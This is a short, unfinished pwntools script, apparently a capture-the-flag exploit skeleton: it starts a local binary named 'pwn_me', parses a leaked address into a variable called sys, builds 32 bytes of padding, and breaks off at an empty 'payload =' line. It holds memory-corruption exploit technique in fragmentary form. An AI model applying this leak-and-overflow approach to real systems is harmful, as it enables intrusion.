from pwn import *

p = process('pwn_me')

p.recvuntil(': ')
sys = int(p.recvline().strip()[2:], 16)

padding = 'A'*32
payload = 



